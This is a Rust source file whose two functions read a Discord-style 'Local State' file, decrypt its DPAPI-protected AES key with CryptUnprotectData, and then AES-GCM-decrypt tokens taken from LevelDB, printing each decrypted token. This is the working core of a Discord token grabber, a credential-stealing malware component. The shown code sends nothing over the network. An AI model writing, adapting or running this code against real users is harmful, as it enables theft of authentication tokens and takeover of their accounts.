use std::fs;
use std::path::Path;
use anyhow::{Result, Context};
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

/// Retrieves and decrypts the DPAPI key from the application's Local State file.
///
/// # Arguments
///
/// * `base_path` - Base directory of the application's data (e.g., Discord Roaming path)
///
/// # Returns
///
/// A `Result<Vec<u8>>` containing the decrypted AES key
pub fn get_key(base_path: &Path) -> Result<Vec<u8>> {
    let local_state_path = base_path.join("Local State");
    println!("[DEBUG] Reading Local State: {}", local_state_path.display());

    let content = fs::read_to_string(&local_state_path)
        .with_context(|| format!("Failed to read {:?}", local_state_path))?;
    let json: serde_json::Value = serde_json::from_str(&content)
        .context("Failed to parse JSON")?;

    // Extract the encrypted key field
    let encrypted_key_b64 = json.pointer("/os_crypt/encrypted_key")
        .and_then(|v| v.as_str())
        .context("Field os_crypt.encrypted_key not found")?;
    println!("[DEBUG] Encrypted key (base64): {}", encrypted_key_b64);

    let encrypted_key = STANDARD.decode(encrypted_key_b64)
        .map_err(|e| anyhow::anyhow!("Base64 decode failed: {:?}", e))?;
    println!("[DEBUG] Encrypted key (bytes, {} bytes)", encrypted_key.len());

    // Strip "DPAPI" prefix (first 5 bytes)
    let dpapi_encrypted = &encrypted_key[5..];
    println!("[DEBUG] DPAPI encrypted part ({} bytes)", dpapi_encrypted.len());

    // Prepare input and output blobs for Windows DPAPI
    let mut in_blob = CRYPT_INTEGER_BLOB {
        cbData: dpapi_encrypted.len() as u32,
        pbData: dpapi_encrypted.as_ptr() as *mut u8,
    };
    let mut out_blob = CRYPT_INTEGER_BLOB { cbData: 0, pbData: std::ptr::null_mut() };

    // Call Windows DPAPI to decrypt key
    unsafe {
        CryptUnprotectData(
            &mut in_blob,
            None,
            None,
            None,
            None,
            0,
            &mut out_blob
        ).ok().context("DPAPI decryption failed")?;
    }

    // Convert decrypted blob into Vec<u8>
    let key = unsafe { std::slice::from_raw_parts(out_blob.pbData, out_blob.cbData as usize).to_vec() };
    println!("[DEBUG] Decrypted DPAPI key ({} bytes)", key.len());
    Ok(key)
}

/// Decrypts an individual token using the AES-256-GCM key.
///
/// # Arguments
///
/// * `token_b64` - Base64-encoded token string from LevelDB
/// * `key` - AES key bytes obtained from DPAPI decryption
///
/// # Returns
///
/// A `Result<String>` containing the decrypted token
pub fn decrypt_token(token_b64: &str, key: &[u8]) -> Result<String> {
    println!("[DEBUG] Decrypting token: {}", token_b64);
    let data = STANDARD.decode(token_b64)
        .map_err(|e| anyhow::anyhow!("Base64 decode failed: {:?}", e))?;
    println!("[DEBUG] Token decoded ({} bytes)", data.len());

    // AES-GCM nonce is located at bytes 3..15
    let nonce_bytes = &data[3..15];
    println!("[DEBUG] Nonce bytes: {:x?}", nonce_bytes);

    // Remaining bytes are ciphertext + tag
    let ciphertext = &data[15..];
    let cipher = Aes256Gcm::new_from_slice(key)
        .map_err(|e| anyhow::anyhow!("Invalid key length: {:?}", e))?;
    println!("[DEBUG] Ciphertext length: {}", ciphertext.len());

    // Decrypt using AES-GCM
    let plaintext = cipher
        .decrypt(Nonce::from_slice(nonce_bytes), ciphertext)
        .map_err(|e| anyhow::anyhow!("AES decrypt failed: {:?}", e))?;
    let decrypted = String::from_utf8_lossy(&plaintext).to_string();
    println!("[DEBUG] Decrypted token: {}", decrypted);
    Ok(decrypted)
}
